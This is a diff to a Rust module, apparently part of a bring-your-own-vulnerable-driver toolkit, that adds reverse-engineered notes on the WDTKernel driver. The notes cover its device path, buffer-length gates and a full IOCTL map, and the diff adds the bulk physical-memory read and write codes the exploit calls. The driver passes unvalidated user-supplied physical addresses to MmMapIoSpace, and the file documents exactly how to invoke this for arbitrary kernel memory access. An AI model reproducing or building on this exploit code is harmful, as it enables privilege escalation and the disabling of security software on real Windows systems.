@@ -6,27 +6,71 @@
 //!
 //! Device: `\\.\__WDT__`
 //!
-//! ## Protocol (verified against magicsword-io/LOLDrivers issue #290)
+//! ## Protocol (GROUND TRUTH: statically reversed from the real binaries)
 //!
-//! Unlike RTCore64/iqvw64e (which take kernel VIRTUAL addresses), WDTKernel's
-//! memory primitive is PHYSICAL-only: every R/W IOCTL feeds a user-supplied
-//! physical address straight to `MmMapIoSpace(physAddr, size, MmNonCached)` with
-//! zero validation, then reads/writes the mapping. Ghidra-verified decomp:
-//! ```c
-//! uint MmioReadDword(PHYSICAL_ADDRESS p)  { uint *m = MmMapIoSpace(p,4,1); uint v=*m; MmUnmapIoSpace(m,4); return v; }
-//! void MmioWriteDword(PHYSICAL_ADDRESS p, uint v) { uint *m = MmMapIoSpace(p,4,1); *m=v; MmUnmapIoSpace(m,4); }
-//! ```
-//! The user-supplied physical address occupies the FIRST 8 bytes of the input
-//! buffer; for writes it is followed by the value.
+//! Verified against both LOLDrivers samples (SHA256-verified downloads):
+//!   - `3a00cd7c…` SHA256 8b695b1a…1462fe — WDT 1.3.5.0 (PDB path string
+//!     `C:\Users\Xinstar\Desktop\Work\WDT1.3.5.0\Tool\WDTKernel.pdb`)
+//!   - `1055e17e…` SHA256 0e27bec3…6b28b7 — WDT 1.3.5.1
+//! Both are x64 KMDF drivers; the EvtIoDeviceControl for the default queue is
+//! at RVA 0x6000 in section `PAGED_CO` (registered at PAGE+0x1b0:
+//! `lea rax,[rip-0x13b7]` → 0x6000, stored into the queue-config struct).
+//! The dispatch tree is byte-identical in both samples (later handlers shifted
+//! by ≤0x10 in 1.3.5.1); RVA citations below are from 1.3.5.0.
 //!
-//! R/W IOCTL codes (current code's 0x9C402580/0x9C402584 are fabricated — the
-//! real codes are the 0x9C4124xx family):
+//! Device `\Device\__WDT__` + symlink `\DosDevices\__WDT__` (strings at RVA
+//! 0x7590/0x75b0 in 1.3.5.0, 0x7580/0x75a0 in 1.3.5.1) ⇒ `\\.\__WDT__`.
+//!
+//! ### Dispatch-wide gates (PAGED_CO 0x6000, EvtIoDeviceControl)
+//!
+//! - **Both buffer lengths must be non-zero**: `test rbx,rbx; je fail` at
+//!   PAGED_CO+0x72 (OutputBufferLength) and `test r15,r15; je fail` at +0x7b
+//!   (InputBufferLength) → `STATUS_INVALID_PARAMETER` (0xC000000D at +0x8d6).
+//!   A write IOCTL issued with a NULL/0 output buffer is REJECTED by the
+//!   driver before any handler runs.
+//! - `WdfRequestRetrieveInputBuffer` / `…OutputBuffer` are called with
+//!   RequiredSize = 0 (`xor r8d,r8d` at +0x9f/+0xdf; WDF fn-table slots
+//!   +0x868/+0x870) — **no minimum-size enforcement**; the handlers deref
+//!   input+0 unconditionally.
+//! - Unknown code → `STATUS_INVALID_DEVICE_REQUEST` (0xC0000010 at +0x889).
+//!
+//! ### IOCTL map — 46 codes, 0x9C412400–0x9C4124B8 step 4
+//!
+//! DeviceType 0x9C41, Function 0x900+idx, **METHOD_BUFFERED** (low 2 bits 0)
+//! for every code. Physical-address primitives (all take PA = u64 LE at
+//! input+0; `mov rcx,[rcx]`):
 //! ```text
-//!   0x9C412408  Read BYTE     MmMapIoSpace(addr,1,1) then read
-//!   0x9C412414  Write BYTE    MmMapIoSpace(addr,1,1) then write value
-//!   0x9C412420  Bulk Read BYTE   maps N bytes, copies byte-by-byte to output
-//!   0x9C41242C  Bulk Write BYTE  maps N bytes, writes from input buffer
+//!   0x9C412400  Read  DWORD   → out u32, Information=4   (+0x1d5 → .text 0x1340)
+//!   0x9C412404  Read  WORD    → out u16, Information=2   (+0x1bd → .text 0x1370)
+//!   0x9C412408  Read  BYTE    → out u8,  Information=1   (+0x1a0 → .text 0x1314)
+//!   0x9C41240C  Write DWORD   val=u32@in+8, echo → out   (+0x184 → .text 0x13d4)
+//!   0x9C412410  Write WORD    val=u16@in+8 ZERO-EXTENDED, but calls the DWORD
+//!                             writer — writes 4 bytes, upper 2 zeroed (+0x160)
+//!   0x9C412414  Write BYTE    val=u8@in+8, echo → out    (+0x213 → .text 0x13a0)
+//!   0x9C412418  Bulk Read  DWORD  map OutLen bytes, rep movsd OutLen>>2 (+0x327)
+//!   0x9C41241C  Bulk Read  WORD   map OutLen bytes, rep movsw OutLen>>1 (+0x2fa)
+//!   0x9C412420  Bulk Read  BYTE   map OutLen bytes, rep movsb OutLen    (+0x2d4)
+//!   0x9C412424  Bulk Write DWORD  map InLen-8 bytes, rep movsd (InLen-8)>>2
+//!                                   from in+8                          (+0x29a)
+//!   0x9C412428  Bulk Write WORD   idem, count (InLen-8)>>1             (+0x265)
+//!   0x9C41242C  Bulk Write BYTE   idem, count InLen-8                  (+0x366)
 //! ```
+//! (0x9C412430–0x45C are I/O-port in/out single+`rep ins/outs`; 0x460/0x464
+//! PCI config 0xCF8/0xCFC; 0x468–0x4B8 watchdog-timer control. Not used here.)
+//!
+//! Chunk/count semantics that this file relies on:
+//! - **Bulk READ**: transfer count = **OutputBufferLength** — `mov rdx,rbx`
+//!   at +0x2e1 maps `rbx` (= OutputBufferLength, never reassigned on the read
+//!   path) bytes, `mov ecx,ebx; rep movsb` at +0x2f1 copies that many bytes to
+//!   the output buffer. Input buffer beyond the 8-byte PA is ignored.
+//! - **Bulk WRITE**: transfer count = **InputBufferLength − 8** —
+//!   `lea rbx,[r15-8]` at +0x36d; map that many bytes, `rep movsb` from
+//!   `in+8` (`add rsi,8` at +0x38b). The output buffer is never written but
+//!   must exist (non-zero length, per the dispatch-wide gate).
+//! - CacheType is always `MmNonCached` (1) — `mov r8d,1` at every
+//!   MmMapIoSpace call site.
+//! - **Zero validation**: no physical-range check, no caller-PID/name check
+//!   anywhere in the dispatch — the PA goes straight to MmMapIoSpace.
 //!
 //! ## Why raw_rw returns an error (operational-safety contract)
 //!
@@ -51,7 +95,10 @@
 //! [`WdtKernel::phys_write`]) implement the correct bulk IOCTL protocol for
 //! that composition.
 //!
-//! Source: github.com/magicsword-io/LOLDrivers/issues/290
+//! Sources: github.com/magicsword-io/LOLDrivers/issues/290 (intel) +
+//! static analysis of the two real samples above (capstone disasm, this repo
+//! `tmp/wdt-re/`) — intel CONFIRMED, and the zero-output-length gate above
+//! is a correction the intel missed.
 
 use crate::byovd::{DeviceIoControlFn, RwOp, VulnDriverIoctl};
 use crate::KrwError;
@@ -61,8 +108,12 @@ use core::ptr;
 pub struct WdtKernel;
 
 /// Bulk read BYTE (physical addr → output buffer), MmMapIoSpace-based.
+/// PAGED_CO+0xf9 `cmp` tree → `je 0x62d4` at +0x24d; handler at +0x2d4
+/// maps OutputBufferLength bytes and `rep movsb`s them out (both samples).
 const WDT_IOCTL_READ_BULK: u32 = 0x9C412420;
 /// Bulk write BYTE (input buffer → physical addr), MmMapIoSpace-based.
+/// `je 0x6366` at +0x11c; handler at +0x366 maps InputBufferLength-8 bytes
+/// and `rep movsb`s from input+8 (both samples).
 const WDT_IOCTL_WRITE_BULK: u32 = 0x9C41242C;
 
 impl VulnDriverIoctl for WdtKernel {
